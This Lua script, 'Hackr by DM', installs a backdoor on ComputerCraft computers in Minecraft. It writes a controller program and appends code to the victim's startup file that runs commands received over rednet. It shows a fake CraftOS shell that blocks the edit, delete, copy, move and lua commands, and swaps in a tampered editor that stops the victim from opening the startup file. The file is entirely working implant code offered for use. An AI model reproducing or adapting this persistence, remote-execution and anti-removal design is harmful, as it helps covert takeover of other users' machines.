--Hackr by DM
as1 = {'id = 4;',
		'local mom = true;',
		'while mom == true do',
		'local derp = read();',
		'if derp == "$sd" then',
		'mom = false;',
		'else',
		'rednet.send(id,derp);',
		'end',
		'end'}
as2 = {"function getHack()",
		'local file = fs.open("repos/id","r");',
		"local id = tonumber(file.readLine());",
		"file.close();",
		"local mom = true;",
		"while mom == true do",
		"local r = {rednet.receive()};",
		"if r[1] == id then",
		"if r[2] == 'sd' then",
		"mom = false;",
		"else",
		"assert(loadstring(r[2]))();",
		'local x,y = term.getCursorPos();',
		'if x ~= 3 then term.setTextColour(fgShell); term.setCursorPos(1,y); term.write("> "); term.setTextColour(fgText); end',
		"end",
		"end",
		"end",
		"end",
		"",
		"function leer(m,l)",
		"l=l or 1;",
		"local i = 1;",
		"local p = '';",
		"local u = {};",
		"repeat",
		"repeat",
		"if m:sub(l,l) ~= ' ' then",
		"p=p..m:sub(l,l);",
		"l=l+1;",
		"end",
		"until m:sub(l,l) == ' '",
		"u[i] = p;",
		"p=''",
		"l=l+1;",
		"i=i+1;",
		'until m:sub(l,l) == ";"',
		"return u",
		"end",
		"",
		"function normalShell()",
		"local mom = true;",
		"if term.isColour() then",
		"fgError,fgShell, fgText = colours.red, colours.yellow, colours.white;",
		"else",
		"fgError, fgShell, fgText = colours.white, colours.white, colours.white;",
		"end",
		'term.setTextColour(fgShell); term.clear(); term.setCursorPos(1,1); term.write("CraftOS 1.7"); term.setCursorPos(1,2);',
		"while mom == true do",
		'term.setTextColour(fgShell); term.write("> "); term.setTextColour(fgText); local derp = read();',
		'if derp == "$dd" then',
		'mom = false; print("Bye bye!");',
		"else",
		'derp = derp.." ;"; local u = leer(derp);',
		'if fs.exists(u[1]) then',
		'shell.run(unpack(u));',
		'elseif fs.exists("rom/programs/"..u[1]) then',
		'if u[1] == "copy" or u[1] == "edit" or u[1] == "delete" or u[1] == "move" or u[1] == "lua" then term.setTextColour(fgError); print("Access denied");',
		'else',
		'u[1] = "rom/programs/"..u[1]; shell.run(unpack(u));',
		'end',
		'else',
		'term.setTextColour(fgError); print("No such program");',
		'end',
		'end',
		'end',
		'end',
		'',
		'parallel.waitForAny(getHack,normalShell);'}

stage = 0

term.clear()
term.setCursorPos(1,1)
print([[Hackr by DM
		Install the Hackr terminal here (1)
		Install the hack-E file here (2)
		Exit (3)]])
local derp = read()
if tonumber(derp) then
	stage = tonumber(derp)
else
	stage = 99
end

if stage == 1 then
	hackr = fs.open("hackr","w")
	local i=1
	while as1[i] do
		hackr.writeLine(as1[i])
		i=i+1
	end
	hackr.close()
elseif stage == 2 then
	--Install start up file
	local mode
	if fs.exists("startup") then 
		mode = "a"
	else 
		mode = "w" 
	end
	hackee = fs.open("startup",mode)
	local i = 1
	while as2[i] do
		hackee.writeLine(as2[i])
		i=i+1
	end
	hackee.close()
	
	--install new edit file
	editN = fs.open("rom/programs/edit","r")
	edit = fs.open("edit","w")
	for i = 1,14 do
		edit.writeLine(editN.readLine())
	end
	edit.writeLine('if sPath == "startup" or sPath == "edit" or sPath == "delete" or sPath == "copy" or sPath == "move" or sPath == "lua" then')
	edit.writeLine('sPath = "dummy" ')
	edit.writeLine("end")
	for i = 1,612 do
		edit.writeLine(editN.readLine())
	end
	edit.writeLine('fs.delete("dummy")')
	edit.close()
	editN.close()
	
	--set up id
	print("Enter in the controller's ID: ")
	file = fs.open("repos/id","w")
	file.write(read())
	file.close();
end